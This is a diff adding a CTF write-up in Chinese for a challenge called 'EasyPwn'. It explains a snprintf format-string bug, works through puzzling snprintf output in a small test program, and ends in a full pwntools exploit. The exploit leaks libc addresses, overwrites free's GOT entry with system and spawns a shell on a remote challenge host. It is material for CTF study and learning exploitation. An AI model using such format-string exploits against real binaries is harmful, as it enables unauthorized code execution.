@@ -3022,3 +3022,126 @@ if __name__ == '__main__':
     io.sendafter(':', payload)
     io.interactive()
 ```
+
+### 32. EasyPwn
+题目：暂无
+
+思路：snprintf格式化字符串漏洞。
+
+#### snprintf逻辑
+snprintf的逻辑比较怪异，没有查到比较确切的原理，对于以下两种情况不知道为什么是这样的输出？
+```c++
+#include<stdio.h>
+
+int main()
+{
+        char a[100] = "aaa%syyyyy";
+        char b[100] = "bbbb%s";
+        char c[100] = "ccc";
+        puts(a);
+        puts(b);
+        puts(c);
+        snprintf(a, 100, a+3, b, c);
+        puts(a);
+        return 0;
+}
+
+./a.out
+aaa%syyyyy
+bbbb%s
+ccc
+bbbb%ssssss
+
+// 修改b
+        char a[100] = "aaa%syyyyy";
+        char b[100] = "bbbb%sA";
+        char c[100] = "ccc";
+输出变为
+aaa%syyyyy
+bbbb%sA
+ccc
+bbbb%sAsAsAscccccc�c�
+```
+
+对于这道题，使用snprintf泄露信息时也存在一个很怪异的地方。
+```python
+# 看了wp代码是这样的，是这样解释的：
+# snprintf首先处理格式化字符串%s，将整个payload拷贝到缓冲区
+# 这时候格式化字符串变为bb%396$p%397$p
+# snprintf会继续处理2个字符以后的内容，因此可以正确泄露
+payload = b'a'*1000 + b'bb%396$p%397$p'
+# 下面这种也是一样的
+payload = b'a'*1000 + b'%s%396$p%397$p'
+
+# ！！！
+# 但是如果覆盖的字符和前面的字符一样就会有问题
+# 经调试发现变量数+1可以得到同样的效果，但是不知道为什么需要加1
+payload = b'a'*1000 + b'aa%397$p%398$p'
+```
+
+全部利用代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+debug = True
+if debug:
+    io = process('./pwn1', aslr=False)
+    #gdb.attach(io)
+else:
+    io = remote('220.249.52.134', 44156)
+
+elf = ELF('pwn1')
+
+
+if __name__ == '__main__':
+    # leak init and __lib_start_main
+    io.sendlineafter('Input Your Code:\n', '1')
+    payload = b'a'*1000 + b'bb%396$p%397$p'
+    #payload = b'a'*1000 + b'aa%397$p%398$p'
+    io.sendafter('\n', payload)
+    data = io.recvuntil('\n')
+    print(data)
+
+    __libc_start_main = int(data.decode('utf8').split('0x')[2][:-1], 16) - 0xf0
+    log.success('__libc_start_main: 0x%x' % __libc_start_main)
+    libc = LibcSearcher('__libc_start_main', __libc_start_main)
+    libc_base = __libc_start_main - libc.dump('__libc_start_main')
+    system_addr = libc_base + libc.dump('system')
+    free_addr = libc_base + libc.dump('free')
+    log.success('system: 0x%x' % system_addr)
+    log.success('free: 0x%x' % free_addr)
+
+    init_addr = int(data.decode('utf8').split('0x')[1], 16)
+    elf_base = init_addr - 0xda0
+    log.success('init: 0x%x' % init_addr)
+    log.success('elf base: 0x%x' % elf_base)
+
+    # load free to got
+    io.sendlineafter('Input Your Code:\n', '2')
+    io.sendlineafter('Input Your Name:\n', '2')
+
+    # modify free got
+    # last two bytes
+    io.sendlineafter('Input Your Code:\n', '1')
+    data1 = system_addr & 0xffff
+    payload = b'a'*1000
+    payload += (b'bb%' + str(data1 - 1022).encode('utf8') + b'c%133$hn').ljust(16, b'a')
+    payload += p64(elf.got['free'] + elf_base)
+    io.sendafter('\n', payload)
+    # last 3,4 bytes
+    io.sendlineafter('Input Your Code:\n', '1')
+    data1 = system_addr & 0xffff0000
+    data1 = data1 >> 16
+    payload = b'a'*1000
+    payload += (b'bb%' + str(data1 - 1022).encode('utf8') + b'c%133$hn').ljust(16, b'a')
+    payload += p64(elf.got['free'] + elf_base + 2)
+    io.sendafter('\n', payload)
+    pause()
+
+    # system
+    io.sendlineafter('Input Your Code:\n', '2')
+    io.sendafter('Input Your Name:\n', b'/bin/sh\x00')
+
+    io.interactive()
+```
